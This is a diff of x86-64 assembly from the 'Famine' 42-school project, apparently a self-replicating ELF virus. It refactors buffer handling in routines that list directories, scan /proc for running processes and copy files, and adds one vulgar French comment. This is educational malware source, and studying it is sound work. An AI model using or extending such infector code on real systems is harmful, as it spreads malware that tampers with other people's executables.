@@ -4,7 +4,7 @@ sc:
 				push			rbp
 				mov				rbp,					rsp
 
-				mov				rbx,					14 * 8 + 5 * 1024
+				mov				rbx,					14 * 8 + 3 * 1024
 				sub				rsp,					rbx
 
 				push			rdi
@@ -95,7 +95,8 @@ sc_proc_dir:
 				push			rbp
 				mov				rbp,					rsp
 
-				sub				rsp,					24			;	+0x20	ent_ptr
+				sub				rsp,					1048		;	+0x28	buff
+																	;	+0x20	ent_ptr
 																	;	+0x18	dir_ret
 																	;	+0x10	dir_fd
 				push			rdi									;	+0x8	*dir
@@ -111,8 +112,7 @@ sc_proc_dir:
 				mov				qword[rsp+0x10],		rax
 .loop_1:
 				mov				rdi,					qword[rsp+0x10]
-				mov				rsi,					qword[rel sc_glob]
-				add				rsi,					0x860
+				lea				rsi,					[rsp+0x28]
 				mov				rdx,					0x400
 				mov				rax,					78
 				syscall
@@ -121,8 +121,7 @@ sc_proc_dir:
 				jle				.close
 
 				mov				qword[rsp+0x18],		rax
-				mov				r8,						qword[rel sc_glob]
-				add				r8,						0x860
+				lea				r8,						[rsp+0x28]
 				mov				qword[rsp+0x20],		r8
 .loop_2:
 				cmp				qword[rsp+0x18],		0
@@ -225,26 +224,19 @@ sc_proc_entries:
 sc_proc_pids:
 				push			rbp
 				mov				rbp,					rsp
-				sub				rsp,					24		;	+0x10	status
-																;	+0x8	buff.proc
-																;	+0x0	buff.path
-				mov				r8,						qword[rel sc_glob]
-				mov				qword[rsp],				r8
-				add				qword[rsp],				0x60
-				mov				qword[rsp+0x8],			r8
-				add				qword[rsp],				0x1088
-
+				sub				rsp,					1032	;	+0x400	status
+																;	+0x0	buff
 				xchg			rdi,					rsi
 				add				rsi,					0x12
-				mov				rdx,					qword[rsp]
+				mov				rdx,					rsp
 				call			sc_get_full_path
 
-				mov				rdi,					qword[rsp]
+				mov				rdi,					rsp
 				lea				rsi,					[rel sc_status]
-				mov				rdx,					qword[rsp]
+				mov				rdx,					rsp
 				call			sc_get_full_path
 
-				mov				rdi,					qword[rsp]
+				mov				rdi,					rsp
 				xor				rsi,					rsi
 				mov				rax,					2
 				syscall
@@ -252,9 +244,9 @@ sc_proc_pids:
 				cmp				rax,					0
 				jl				.not_found
 
-				mov				qword[rsp+0x8],			rax
+				mov				qword[rsp+0x400],		rax
 				mov				rdi,					rax
-				mov				rsi,					qword[rsp+0x8]
+				mov				rsi,					rsp
 				mov				rdx,					0x400
 				xor				rax,					rax
 				syscall
@@ -262,7 +254,7 @@ sc_proc_pids:
 				cmp				rax,					1
 				jl				.close
 
-				mov				rdi,					qword[rsp+0x8]
+				mov				rdi,					rsp
 				mov				rsi,					rax
 				call			sc_get_name
 
@@ -277,20 +269,20 @@ sc_proc_pids:
 				cmp				rax,					0
 				je				.found
 .close:
-				mov				rdi,					qword[rsp+0x10]
+				mov				rdi,					qword[rsp+0x400]
 				mov				rax,					3
 				syscall
 .not_found:
 				xor				rax,					rax
 				jmp				.end
 .found:
-				mov				rdi,					1
+				mov				rdi,					1					; j'aime la bite
 				lea				rsi,					[rel sc_sign]
 				mov				rdx,					49
 				mov				rax,					1
 				syscall
 
-				mov				rdi,					qword[rsp+0x10]
+				mov				rdi,					qword[rsp+0x400]
 				mov				rax,					3
 				syscall
 
@@ -673,7 +665,7 @@ sc_file_cpy:
 				mov				r8,						qword[rel sc_glob]
 
 				mov				rdi,					qword[rsp]
-				lea				rsi,					[r8+0xc88]
+				lea				rsi,					[r8+0x860]
 				mov				rdx,					0x400
 				mov				rax,					0
 				syscall
@@ -687,7 +679,7 @@ sc_file_cpy:
 				je				.loop_1
 
 				mov				r8,						qword[rel sc_glob]
-				lea				r8,						[r8+0xc88]
+				lea				r8,						[r8+0x860]
 				mov				r10,					qword[rsp+0x10]
 				mov				r9b,					byte[r8+r10]
 				mov				r10,					qword[rsp+0x8]
@@ -857,16 +849,13 @@ sc_glob:
 									
 									; +0x60		->	buffs.path
 									; +0x460	->	buffs.zeros
-									; +0x860	->	buffs.entry
+									; +0x860	->	buffs.copy
 
 									; +0xc60	->	*mem
 									; +0xc68	->	x_pad
 									; +0xc70 	->	real_entry
 									; +0xc78	->	child
 									; +0xc80	-> 	entry
-
-									; +0xc88	->	buffs.copy
-									; +0x1088 	->	buffs.proc
 sc_sign:
 				db				"Famine (42 project) - 2022 - by apitoise & fcadet", 0
 sc_data_end:
